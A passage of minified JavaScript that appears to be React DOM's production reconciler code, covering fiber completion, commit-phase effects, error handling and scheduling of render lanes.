Error(P(166));if(n=Wn(si.current),Wn(jt.current),Yi(t)){if(s=t.stateNode,n=t.memoizedProps,s[qt]=t,(i=s.nodeValue!==n)&&(e=Ke,e!==null))switch(e.tag){case 3:Ki(s.nodeValue,n,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&Ki(s.nodeValue,n,(e.mode&1)!==0)}i&&(t.flags|=4)}else s=(n.nodeType===9?n:n.ownerDocument).createTextNode(s),s[qt]=t,t.stateNode=s}return Te(t),null;case 13:if(J(ee),s=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(Z&&Qe!==null&&t.mode&1&&!(t.flags&128))vy(),$s(),t.flags|=98560,i=!1;else if(i=Yi(t),s!==null&&s.dehydrated!==null){if(e===null){if(!i)throw Error(P(318));if(i=t.memoizedState,i=i!==null?i.dehydrated:null,!i)throw Error(P(317));i[qt]=t}else $s(),!(t.flags&128)&&(t.memoizedState=null),t.flags|=4;Te(t),i=!1}else gt!==null&&(eu(gt),gt=null),i=!0;if(!i)return t.flags&65536?t:null}return t.flags&128?(t.lanes=n,t):(s=s!==null,s!==(e!==null&&e.memoizedState!==null)&&s&&(t.child.flags|=8192,t.mode&1&&(e===null||ee.current&1?fe===0&&(fe=3):Pd())),t.updateQueue!==null&&(t.flags|=4),Te(t),null);case 4:return Qs(),Hc(e,t),e===null&&Zr(t.stateNode.containerInfo),Te(t),null;case 10:return hd(t.type._context),Te(t),null;case 17:return Be(t.type)&&Go(),Te(t),null;case 19:if(J(ee),i=t.memoizedState,i===null)return Te(t),null;if(s=(t.flags&128)!==0,o=i.rendering,o===null)if(s)mr(i,!1);else{if(fe!==0||e!==null&&e.flags&128)for(e=t.child;e!==null;){if(o=ta(e),o!==null){for(t.flags|=128,mr(i,!1),s=o.updateQueue,s!==null&&(t.updateQueue=s,t.flags|=4),t.subtreeFlags=0,s=n,n=t.child;n!==null;)i=n,e=s,i.flags&=14680066,o=i.alternate,o===null?(i.childLanes=0,i.lanes=e,i.child=null,i.subtreeFlags=0,i.memoizedProps=null,i.memoizedState=null,i.updateQueue=null,i.dependencies=null,i.stateNode=null):(i.childLanes=o.childLanes,i.lanes=o.lanes,i.child=o.child,i.subtreeFlags=0,i.deletions=null,i.memoizedProps=o.memoizedProps,i.memoizedState=o.memoizedState,i.updateQueue=o.updateQueue,i.type=o.type,e=o.dependencies,i.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),n=n.sibling;return K(ee,ee.current&1|2),t.child}e=e.sibling}i.tail!==null&&ie()>Ks&&(t.flags|=128,s=!0,mr(i,!1),t.lanes=4194304)}else{if(!s)if(e=ta(o),e!==null){if(t.flags|=128,s=!0,n=e.updateQueue,n!==null&&(t.updateQueue=n,t.flags|=4),mr(i,!0),i.tail===null&&i.tailMode==="hidden"&&!o.alternate&&!Z)return Te(t),null}else 2*ie()-i.renderingStartTime>Ks&&n!==1073741824&&(t.flags|=128,s=!0,mr(i,!1),t.lanes=4194304);i.isBackwards?(o.sibling=t.child,t.child=o):(n=i.last,n!==null?n.sibling=o:t.child=o,i.last=o)}return i.tail!==null?(t=i.tail,i.rendering=t,i.tail=t.sibling,i.renderingStartTime=ie(),t.sibling=null,n=ee.current,K(ee,s?n&1|2:n&1),t):(Te(t),null);case 22:case 23:return Rd(),s=t.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(t.flags|=8192),s&&t.mode&1?He&1073741824&&(Te(t),t.subtreeFlags&6&&(t.flags|=8192)):Te(t),null;case 24:return null;case 25:return null}throw Error(P(156,t.tag))}function wk(e,t){switch(ld(t),t.tag){case 1:return Be(t.type)&&Go(),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return Qs(),J(Fe),J(Ae),yd(),e=t.flags,e&65536&&!(e&128)?(t.flags=e&-65537|128,t):null;case 5:return gd(t),null;case 13:if(J(ee),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(P(340));$s()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return J(ee),null;case 4:return Qs(),null;case 10:return hd(t.type._context),null;case 22:case 23:return Rd(),null;case 24:return null;default:return null}}var Zi=!1,Ce=!1,vk=typeof WeakSet=="function"?WeakSet:Set,I=null;function Cs(e,t){var n=e.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(s){re(e,t,s)}else n.current=null}function Qc(e,t,n){try{n()}catch(s){re(e,t,s)}}var qp=!1;function bk(e,t){if(qc=zo,e=oy(),od(e)){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{n=(n=e.ownerDocument)&&n.defaultView||window;var s=n.getSelection&&n.getSelection();if(s&&s.rangeCount!==0){n=s.anchorNode;var r=s.anchorOffset,i=s.focusNode;s=s.focusOffset;try{n.nodeType,i.nodeType}catch{n=null;break e}var o=0,a=-1,l=-1,c=0,u=0,d=e,h=null;t:for(;;){for(var m;d!==n||r!==0&&d.nodeType!==3||(a=o+r),d!==i||s!==0&&d.nodeType!==3||(l=o+s),d.nodeType===3&&(o+=d.nodeValue.length),(m=d.firstChild)!==null;)h=d,d=m;for(;;){if(d===e)break t;if(h===n&&++c===r&&(a=o),h===i&&++u===s&&(l=o),(m=d.nextSibling)!==null)break;d=h,h=d.parentNode}d=m}n=a===-1||l===-1?null:{start:a,end:l}}else n=null}n=n||{start:0,end:0}}else n=null;for(Oc={focusedElem:e,selectionRange:n},zo=!1,I=t;I!==null;)if(t=I,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,I=e;else for(;I!==null;){t=I;try{var f=t.alternate;if(t.flags&1024)switch(t.tag){case 0:case 11:case 15:break;case 1:if(f!==null){var v=f.memoizedProps,x=f.memoizedState,y=t.stateNode,g=y.getSnapshotBeforeUpdate(t.elementType===t.type?v:ft(t.type,v),x);y.__reactInternalSnapshotBeforeUpdate=g}break;case 3:var b=t.stateNode.containerInfo;b.nodeType===1?b.textContent="":b.nodeType===9&&b.documentElement&&b.removeChild(b.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(P(163))}}catch(k){re(t,t.return,k)}if(e=t.sibling,e!==null){e.return=t.return,I=e;break}I=t.return}return f=qp,qp=!1,f}function Mr(e,t,n){var s=t.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var r=s=s.next;do{if((r.tag&e)===e){var i=r.destroy;r.destroy=void 0,i!==void 0&&Qc(t,n,i)}r=r.next}while(r!==s)}}function Da(e,t){if(t=t.updateQueue,t=t!==null?t.lastEffect:null,t!==null){var n=t=t.next;do{if((n.tag&e)===e){var s=n.create;n.destroy=s()}n=n.next}while(n!==t)}}function Gc(e){var t=e.ref;if(t!==null){var n=e.stateNode;switch(e.tag){case 5:e=n;break;default:e=n}typeof t=="function"?t(e):t.current=e}}function nw(e){var t=e.alternate;t!==null&&(e.alternate=null,nw(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&(delete t[qt],delete t[ti],delete t[jc],delete t[nk],delete t[sk])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function sw(e){return e.tag===5||e.tag===3||e.tag===4}function Op(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||sw(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Kc(e,t,n){var s=e.tag;if(s===5||s===6)e=e.stateNode,t?n.nodeType===8?n.parentNode.insertBefore(e,t):n.insertBefore(e,t):(n.nodeType===8?(t=n.parentNode,t.insertBefore(e,n)):(t=n,t.appendChild(e)),n=n._reactRootContainer,n!=null||t.onclick!==null||(t.onclick=Qo));else if(s!==4&&(e=e.child,e!==null))for(Kc(e,t,n),e=e.sibling;e!==null;)Kc(e,t,n),e=e.sibling}function Yc(e,t,n){var s=e.tag;if(s===5||s===6)e=e.stateNode,t?n.insertBefore(e,t):n.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Yc(e,t,n),e=e.sibling;e!==null;)Yc(e,t,n),e=e.sibling}var ve=null,mt=!1;function tn(e,t,n){for(n=n.child;n!==null;)rw(e,t,n),n=n.sibling}function rw(e,t,n){if(Nt&&typeof Nt.onCommitFiberUnmount=="function")try{Nt.onCommitFiberUnmount(Pa,n)}catch{}switch(n.tag){case 5:Ce||Cs(n,t);case 6:var s=ve,r=mt;ve=null,tn(e,t,n),ve=s,mt=r,ve!==null&&(mt?(e=ve,n=n.stateNode,e.nodeType===8?e.parentNode.removeChild(n):e.removeChild(n)):ve.removeChild(n.stateNode));break;case 18:ve!==null&&(mt?(e=ve,n=n.stateNode,e.nodeType===8?vl(e.parentNode,n):e.nodeType===1&&vl(e,n),Yr(e)):vl(ve,n.stateNode));break;case 4:s=ve,r=mt,ve=n.stateNode.containerInfo,mt=!0,tn(e,t,n),ve=s,mt=r;break;case 0:case 11:case 14:case 15:if(!Ce&&(s=n.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){r=s=s.next;do{var i=r,o=i.destroy;i=i.tag,o!==void 0&&(i&2||i&4)&&Qc(n,t,o),r=r.next}while(r!==s)}tn(e,t,n);break;case 1:if(!Ce&&(Cs(n,t),s=n.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=n.memoizedProps,s.state=n.memoizedState,s.componentWillUnmount()}catch(a){re(n,t,a)}tn(e,t,n);break;case 21:tn(e,t,n);break;case 22:n.mode&1?(Ce=(s=Ce)||n.memoizedState!==null,tn(e,t,n),Ce=s):tn(e,t,n);break;default:tn(e,t,n)}}function Ip(e){var t=e.updateQueue;if(t!==null){e.updateQueue=null;var n=e.stateNode;n===null&&(n=e.stateNode=new vk),t.forEach(function(s){var r=Pk.bind(null,e,s);n.has(s)||(n.add(s),s.then(r,r))})}}function dt(e,t){var n=t.deletions;if(n!==null)for(var s=0;s<n.length;s++){var r=n[s];try{var i=e,o=t,a=o;e:for(;a!==null;){switch(a.tag){case 5:ve=a.stateNode,mt=!1;break e;case 3:ve=a.stateNode.containerInfo,mt=!0;break e;case 4:ve=a.stateNode.containerInfo,mt=!0;break e}a=a.return}if(ve===null)throw Error(P(160));rw(i,o,r),ve=null,mt=!1;var l=r.alternate;l!==null&&(l.return=null),r.return=null}catch(c){re(r,t,c)}}if(t.subtreeFlags&12854)for(t=t.child;t!==null;)iw(t,e),t=t.sibling}function iw(e,t){var n=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(dt(t,e),St(e),s&4){try{Mr(3,e,e.return),Da(3,e)}catch(v){re(e,e.return,v)}try{Mr(5,e,e.return)}catch(v){re(e,e.return,v)}}break;case 1:dt(t,e),St(e),s&512&&n!==null&&Cs(n,n.return);break;case 5:if(dt(t,e),St(e),s&512&&n!==null&&Cs(n,n.return),e.flags&32){var r=e.stateNode;try{Hr(r,"")}catch(v){re(e,e.return,v)}}if(s&4&&(r=e.stateNode,r!=null)){var i=e.memoizedProps,o=n!==null?n.memoizedProps:i,a=e.type,l=e.updateQueue;if(e.updateQueue=null,l!==null)try{a==="input"&&i.type==="radio"&&i.name!=null&&Eg(r,i),bc(a,o);var c=bc(a,i);for(o=0;o<l.length;o+=2){var u=l[o],d=l[o+1];u==="style"?Ig(r,d):u==="dangerouslySetInnerHTML"?qg(r,d):u==="children"?Hr(r,d):Qu(r,u,d,c)}switch(a){case"input":mc(r,i);break;case"textarea":Rg(r,i);break;case"select":var h=r._wrapperState.wasMultiple;r._wrapperState.wasMultiple=!!i.multiple;var m=i.value;m!=null?Ns(r,!!i.multiple,m,!1):h!==!!i.multiple&&(i.defaultValue!=null?Ns(r,!!i.multiple,i.defaultValue,!0):Ns(r,!!i.multiple,i.multiple?[]:"",!1))}r[ti]=i}catch(v){re(e,e.return,v)}}break;case 6:if(dt(t,e),St(e),s&4){if(e.stateNode===null)throw Error(P(162));r=e.stateNode,i=e.memoizedProps;try{r.nodeValue=i}catch(v){re(e,e.return,v)}}break;case 3:if(dt(t,e),St(e),s&4&&n!==null&&n.memoizedState.isDehydrated)try{Yr(t.containerInfo)}catch(v){re(e,e.return,v)}break;case 4:dt(t,e),St(e);break;case 13:dt(t,e),St(e),r=e.child,r.flags&8192&&(i=r.memoizedState!==null,r.stateNode.isHidden=i,!i||r.alternate!==null&&r.alternate.memoizedState!==null||(Ad=ie())),s&4&&Ip(e);break;case 22:if(u=n!==null&&n.memoizedState!==null,e.mode&1?(Ce=(c=Ce)||u,dt(t,e),Ce=c):dt(t,e),St(e),s&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!u&&e.mode&1)for(I=e,u=e.child;u!==null;){for(d=I=u;I!==null;){switch(h=I,m=h.child,h.tag){case 0:case 11:case 14:case 15:Mr(4,h,h.return);break;case 1:Cs(h,h.return);var f=h.stateNode;if(typeof f.componentWillUnmount=="function"){s=h,n=h.return;try{t=s,f.props=t.memoizedProps,f.state=t.memoizedState,f.componentWillUnmount()}catch(v){re(s,n,v)}}break;case 5:Cs(h,h.return);break;case 22:if(h.memoizedState!==null){jp(d);continue}}m!==null?(m.return=h,I=m):jp(d)}u=u.sibling}e:for(u=null,d=e;;){if(d.tag===5){if(u===null){u=d;try{r=d.stateNode,c?(i=r.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none"):(a=d.stateNode,l=d.memoizedProps.style,o=l!=null&&l.hasOwnProperty("display")?l.display:null,a.style.display=Og("display",o))}catch(v){re(e,e.return,v)}}}else if(d.tag===6){if(u===null)try{d.stateNode.nodeValue=c?"":d.memoizedProps}catch(v){re(e,e.return,v)}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===e)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===e)break e;for(;d.sibling===null;){if(d.return===null||d.return===e)break e;u===d&&(u=null),d=d.return}u===d&&(u=null),d.sibling.return=d.return,d=d.sibling}}break;case 19:dt(t,e),St(e),s&4&&Ip(e);break;case 21:break;default:dt(t,e),St(e)}}function St(e){var t=e.flags;if(t&2){try{e:{for(var n=e.return;n!==null;){if(sw(n)){var s=n;break e}n=n.return}throw Error(P(160))}switch(s.tag){case 5:var r=s.stateNode;s.flags&32&&(Hr(r,""),s.flags&=-33);var i=Op(e);Yc(e,i,r);break;case 3:case 4:var o=s.stateNode.containerInfo,a=Op(e);Kc(e,a,o);break;default:throw Error(P(161))}}catch(l){re(e,e.return,l)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function xk(e,t,n){I=e,ow(e)}function ow(e,t,n){for(var s=(e.mode&1)!==0;I!==null;){var r=I,i=r.child;if(r.tag===22&&s){var o=r.memoizedState!==null||Zi;if(!o){var a=r.alternate,l=a!==null&&a.memoizedState!==null||Ce;a=Zi;var c=Ce;if(Zi=o,(Ce=l)&&!c)for(I=r;I!==null;)o=I,l=o.child,o.tag===22&&o.memoizedState!==null?Mp(r):l!==null?(l.return=o,I=l):Mp(r);for(;i!==null;)I=i,ow(i),i=i.sibling;I=r,Zi=a,Ce=c}Np(e)}else r.subtreeFlags&8772&&i!==null?(i.return=r,I=i):Np(e)}}function Np(e){for(;I!==null;){var t=I;if(t.flags&8772){var n=t.alternate;try{if(t.flags&8772)switch(t.tag){case 0:case 11:case 15:Ce||Da(5,t);break;case 1:var s=t.stateNode;if(t.flags&4&&!Ce)if(n===null)s.componentDidMount();else{var r=t.elementType===t.type?n.memoizedProps:ft(t.type,n.memoizedProps);s.componentDidUpdate(r,n.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var i=t.updateQueue;i!==null&&yp(t,i,s);break;case 3:var o=t.updateQueue;if(o!==null){if(n=null,t.child!==null)switch(t.child.tag){case 5:n=t.child.stateNode;break;case 1:n=t.child.stateNode}yp(t,o,n)}break;case 5:var a=t.stateNode;if(n===null&&t.flags&4){n=a;var l=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":l.autoFocus&&n.focus();break;case"img":l.src&&(n.src=l.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(t.memoizedState===null){var c=t.alternate;if(c!==null){var u=c.memoizedState;if(u!==null){var d=u.dehydrated;d!==null&&Yr(d)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(P(163))}Ce||t.flags&512&&Gc(t)}catch(h){re(t,t.return,h)}}if(t===e){I=null;break}if(n=t.sibling,n!==null){n.return=t.return,I=n;break}I=t.return}}function jp(e){for(;I!==null;){var t=I;if(t===e){I=null;break}var n=t.sibling;if(n!==null){n.return=t.return,I=n;break}I=t.return}}function Mp(e){for(;I!==null;){var t=I;try{switch(t.tag){case 0:case 11:case 15:var n=t.return;try{Da(4,t)}catch(l){re(t,n,l)}break;case 1:var s=t.stateNode;if(typeof s.componentDidMount=="function"){var r=t.return;try{s.componentDidMount()}catch(l){re(t,r,l)}}var i=t.return;try{Gc(t)}catch(l){re(t,i,l)}break;case 5:var o=t.return;try{Gc(t)}catch(l){re(t,o,l)}}}catch(l){re(t,t.return,l)}if(t===e){I=null;break}var a=t.sibling;if(a!==null){a.return=t.return,I=a;break}I=t.return}}var kk=Math.ceil,ra=Jt.ReactCurrentDispatcher,Td=Jt.ReactCurrentOwner,ot=Jt.ReactCurrentBatchConfig,W=0,we=null,ue=null,xe=0,He=0,As=En(0),fe=0,ai=null,ns=0,_a=0,Cd=0,Lr=null,Me=null,Ad=0,Ks=1/0,Vt=null,ia=!1,Xc=null,wn=null,eo=!1,un=null,oa=0,Dr=0,Jc=null,Ro=-1,Po=0;function qe(){return W&6?ie():Ro!==-1?Ro:Ro=ie()}function vn(e){return e.mode&1?W&2&&xe!==0?xe&-xe:ik.transition!==null?(Po===0&&(Po=zg()),Po):(e=z,e!==0||(e=window.event,e=e===void 0?16:Xg(e.type)),e):1}function xt(e,t,n,s){if(50<Dr)throw Dr=0,Jc=null,Error(P(185));ki(e,n,s),(!(W&2)||e!==we)&&(e===we&&(!(W&2)&&(_a|=n),fe===4&&ln(e,xe)),Ve(e,s),n===1&&W===0&&!(t.mode&1)&&(Ks=ie()+500,ja&&Rn()))}function Ve(e,t){var n=e.callbackNode;i0(e,t);var s=Uo(e,e===we?xe:0);if(s===0)n!==null&&zh(n),e.callbackNode=null,e.callbackPriority=0;else if(t=s&-s,e.callbackPriority!==t){if(n!=null&&zh(n),t===1)e.tag===0?rk(Lp.bind(null,e)):gy(Lp.bind(null,e)),ek(function(){!(W&6)&&Rn()}),n=null;else{switch($g(s)){case 1:n=Ju;break;case 4:n=Wg;break;case 16:n=Wo;break;case 536870912:n=Ug;break;default:n=Wo}n=fw(n,aw.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function aw(e,t){if(Ro=-1,Po=0,W&6)throw Error(P(327));var n=e.callbackNode;if(_s()&&e.callbackNode!==n)return null;var s=Uo(e,e===we?xe:0);if(s===0)return null;if(s&30||s&e.expiredLanes||t)t=aa(e,s);else{t=s;var r=W;W|=2;var i=cw();(we!==e||xe!==t)&&(Vt=null,Ks=ie()+500,Hn(e,t));do try{Ck();break}catch(a){lw(e,a)}while(!0);dd(),ra.current=i,W=r,ue!==null?t=0:(we=null,xe=0,t=fe)}if(t!==0){if(t===2&&(r=Cc(e),r!==0&&(s=r,t=Zc(e,r))),t===1)throw n=ai,Hn(e,0),ln(e,s),Ve(e,ie()),n;if(t===6)ln(e,s);else{if(r=e.current.alternate,!(s&30)&&!Sk(r)&&(t=aa(e,s),t===2&&(i=Cc(e),i!==0&&(s=i,t=Zc(e,i))),t===1))throw n=ai,Hn(e,0),ln(e,s),Ve(e,ie()),n;switch(e.finishedWork=r,e.finishedLanes=s,t){case 0:case 1:throw Error(P(345));case 2:Dn(e,Me,Vt);break;case 3:if(ln(e,s),(s&130023424)===s&&(t=Ad+500-ie(),10<t)){if(Uo(e,0)!==0)break;if(r=e.suspendedLanes,(r&s)!==s){qe(),e.pingedLanes|=e.suspendedLanes&r;break}e.timeoutHandle=Nc(Dn.bind(null,e,Me,Vt),t);break}Dn(e,Me,Vt);break;case 4:if(ln(e,s),(s&4194240)===s)break;for(t=e.eventTimes,r=-1;0<s;){var o=31-bt(s);i=1<<o,o=t[o],o>r&&(r=o),s&=~i}if(s=r,s=ie()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*kk(s/1960))-s,10<s){e.timeoutHandle=Nc(Dn.bind(null,e,Me,Vt),s);break}Dn(e,Me,Vt);break;case 5:Dn(e,Me,Vt);break;default:throw Error(P(329))}}}return Ve(e,ie()),e.callbackNode===n?aw.bind(null,e):null}function Zc(e,t){var n=Lr;return e.current.memoizedState.isDehydrated&&(Hn(e,t).flags|=256),e=aa(e,t),e!==2&&(t=Me,Me=n,t!==null&&eu(t)),e}function eu(e){Me===null?Me=e:Me.push.apply(Me,e)}function Sk(e){for(var t=e;;){if(t.flags&16384){var n=t.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var s=0;s<n.length;s++){var r=n[s],i=r.getSnapshot;r=r.value;try{if(!kt(i(),r))return!1}catch{return!1}}}if(n=t.child,t.subtreeFlags&16384&&n!==null)n.return=t,t=n;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function ln(e,t){for(t&=~Cd,t&=~_a,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-bt(t),s=1<<n;e[n]=-1,t&=~s}}function Lp(e){if(W&6)throw Error(P(327));_s();var t=Uo(e,0);if(!(t&1))return Ve(e,ie()),null;var n=aa(e,t);if(e.tag!==0&&n===2){var s=Cc(e);s!==0&&(t=s,n=Zc(e,s))}if(n===1)throw n=ai,Hn(e,0),ln(e,t),Ve(e,ie()),n;if(n===6)throw Error(P(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,Dn(e,Me,Vt),Ve(e,ie()),null}function Ed(e,t){var n=W;W|=1;try{return e(t)}finally{W=n,W===0&&(Ks=ie()+500,ja&&Rn())}}function ss(e){un!==null&&un.tag===0&&!(W&6)&&_s();var t=W;W|=1;var n=ot.transition,s=z;try{if(ot.transition=null,z=1,e)return e()}finally{z=s,ot.transition=n,W=t,!(W&6)&&Rn()}}function Rd(){He=As.current,J(As)}function Hn(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(n!==-1&&(e.timeoutHandle=-1,Z0(n)),ue!==null)for(n=ue.return;n!==null;){var s=n;switch(ld(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&Go();break;case 3:Qs(),J(Fe),J(Ae),yd();break;case 5:gd(s);break;case 4:Qs();break;case 13:J(ee);break;case 19:J(ee);break;case 10:hd(s.type._context);break;case 22:case 23:Rd()}n=n.return}if(we=e,ue=e=bn(e.current,null),xe=He=t,fe=0,ai=null,Cd=_a=ns=0,Me=Lr=null,Vn!==null){for(t=0;t<Vn.length;t++)if(n=Vn[t],s=n.interleaved,s!==null){n.interleaved=null;var r=s.next,i=n.pending;if(i!==null){var o=i.next;i.next=r,s.next=o}n.pending=s}Vn=null}return e}function lw(e,t){do{var n=ue;try{if(dd(),Co.current=sa,na){for(var s=te.memoizedState;s!==null;){var r=s.queue;r!==null&&(r.pending=null),s=s.next}na=!1}if(ts=0,ge=pe=te=null,jr=!1,ri=0,Td.current=null,n===null||n.return===null){fe=1,ai=t,ue=null;break}e:{var i=e,o=n.return,a=n,l=t;if(t=xe,a.flags|=32768,l!==null&&typeof l=="object"&&typeof l.then=="function"){var c=l,u=a,d=u.tag;if(!(u.mode&1)&&(d===0||d===11||d===15)){var h=u.alternate;h?(u.updateQueue=h.updateQueue,u.memoizedState=h.memoizedState,u.lanes=h.lanes):(u.updateQueue=null,u.memoizedState=null)}var m=Sp(o);if(m!==null){m.flags&=-257,Tp(m,o,a,i,t),m.mode&1&&kp(i,c,t),t=m,l=c;var f=t.updateQueue;if(f===null){var v=new Set;v.add(l),t.updateQueue=v}else f.add(l);break e}else{if(!(t&1)){kp(i,c,t),Pd();break e}l=Error(P(426))}}else if(Z&&a.mode&1){var x=Sp(o);if(x!==null){!(x.flags&65536)&&(x.flags|=256),Tp(x,o,a,i,t),cd(Gs(l,a));break e}}i=l=Gs(l,a),fe!==4&&(fe=2),Lr===null?Lr=[i]:Lr.push(i),i=o;do{switch(i.tag){case 3:i.flags|=65536,t&=-t,i.lanes|=t;var y=$y(i,l,t);gp(i,y);break e;case 1:a=l;var g=i.type,b=i.stateNode;if(!(i.flags&128)&&(typeof g.getDerivedStateFromError=="function"||b!==null&&typeof b.componentDidCatch=="function"&&(wn===null||!wn.has(b)))){i.flags|=65536,t&=-t,i.lanes|=t;var k=Hy(i,a,t);gp(i,k);break e}}i=i.return}while(i!==null)}dw(n)}catch(C){t=C,ue===n&&n!==null&&(ue=n=n.return);continue}break}while(!0)}function cw(){var e=ra.current;return ra.current=sa,e===null?sa:e}function Pd(){(fe===0||fe===3||fe===2)&&(fe=4),we===null||!(ns&268435455)&&!(_a&268435455)||ln(we,xe)}function aa(e,t){var n=W;W|=2;var s=cw();(we!==e||xe!==t)&&(Vt=null,Hn(e,t));do try{Tk();break}catch(r){lw(e,r)}while(!0);if(dd(),W=n,ra.current=s,ue!==null)throw Error(P(261));return we=null,xe=0,fe}function Tk(){for(;ue!==null;)uw(ue)}function Ck(){for(;ue!==null&&!Yx();)uw(ue)}function uw(e){var t=pw(e.alternate,e,He);e.memoizedProps=e.pendingProps,t===null?dw(e):ue=t,Td.current=null}function dw(e){var t=e;do{var n=t.alternate;if(e=t.return,t.flags&32768){if(n=wk(n,t),n!==null){n.flags&=32767,ue=n;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{fe=6,ue=null;return}}else if(n=yk(n,t,He),n!==null){ue=n;return}if(t=t.sibling,t!==null){ue=t;return}ue=t=e}while(t!==null);fe===0&&(fe=5)}function Dn(e,t,n){var s=z,r=ot.transition;try{ot.transition=null,z=1,Ak(e,t,n,s)}finally{ot.transition=r,z=s}return null}function Ak(e,t,n,s){do _s();while(un!==null);if(W&6)throw Error(P(327));n=e.finishedWork;var r=e.finishedLanes;if(n===null)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(P(177));e.callbackNode=null,e.callbackPriority=0;var i=n.lanes|n.childLanes;if(o0(e,i),e===we&&(ue=we=null,xe=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||eo||(eo=!0,fw(Wo,function(){return _s(),null})),i=(n.flags&15990)!==0,n.subtreeFlags&15990||i){i=ot.transition,ot.transition=null;var o=z;z=1;var a=W;W|=4,Td.current=null,bk(e,n),iw(n,e),H0(Oc),zo=!!qc,Oc=qc=null,e.current=n,xk(n),Xx(),W=a,z=o,ot.transition=i}else e.current=n;if(eo&&(eo=!1,un=e,oa=r),i=e.pendingLanes,i===0&&(wn=null),e0(n.stateNode),Ve(e,ie()),t!==null)for(s=e.onRecoverableError,n=0;n<t.length;n++)r=t[n],s(r.value,{componentStack:r.stack,digest:r.digest});if(ia)throw ia=!1,e=Xc,Xc=null,e;return oa&1&&e.tag!==0&&_s(),i=e.pendingLanes,i&1?e===Jc?Dr++:(Dr=0,Jc=e):Dr=0,Rn(),null}function _s(){if(un!==null){var e=$g(oa),t=ot.transition,n=z;try{if(ot.transition=null,z=16>e?16:e,un===null)var s=!1;else{if(e=un,un=null,oa=0,W&6)throw Error(P(331));var r=W;for(W|=4,I=e.current;I!==null;){var i=I,o=i.child;if(I.flags&16){var a=i.deletions;if(a!==null){for(var l=0;l<a.length;l++){var c=a[l];for(I=c;I!==null;){var u=I;switch(u.tag){case 0:case 11:case 15:Mr(8,u,i)}var d=u.child;if(d!==null)d.return=u,I=d;else for(;I!==null;){u=I;var h=u.sibling,m=u.return;if(nw(u),u===c){I=null;break}if(h!==null){h.return=m,I=h;break}I=m}}}var f=i.alternate;if(f!==null){var v=f.child;if(v!==null){f.child=null;do{var x=v.sibling;v.sibling=null,v=x}while(v!==null)}}I=i}}if(i.subtreeFlags&2064&&o!==null)o.return=i,I=o;else e:for(;I!==null;){if(i=I,i.flags&2048)switch(i.tag){case 0:case 11:case 15:Mr(9,i,i.return)}var y=i.sibling;if(y!==null){y.return=i.return,I=y;break e}I=i.return}}var g=e.current;for(I=g;I!==null;){o=I;var b=o.child;if(o.subtreeFlags&2064&&b!==null)b.return=o,I=b;else e:for(o=g;I!==null;){if(a=I,a.flags&2048)try{switch(a.tag){case 0:case 11:case 15:Da(9,a)}}catch(C){re(a,a.return,C)}if(a===o){I=null;break e}var k=a.sibling;if(k!==null){k.return=a.return,I=k;break e}I=a.return}}if(W=r,Rn(),Nt&&typeof Nt.onPostCommitFiberRoot=="function")try{Nt.onPostCommitFiberRoot(Pa,e)}catch{}s=!0}return s}finally{z=n,ot.transition=t}}return!1}function Dp(e,t,n){t=Gs(n,t),t=$y(e,t,1),e=yn(e,t,1),t=qe(),e!==null&&(ki(e,1,t),Ve(e,t))}function re(e,t,n){if(e.tag===3)Dp(e,e,n);else for(;t!==null;){if(t.tag===3){Dp(t,e,n);break}else if(t.tag===1){var s=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(wn===null||!wn.has(s))){e=Gs(n,e),e=Hy(t,e,1),t=yn(t,e,1),e=qe(),t!==null&&(ki(t,1,e),Ve(t,e));break}}t=t.return}}function Ek(e,t,n){var 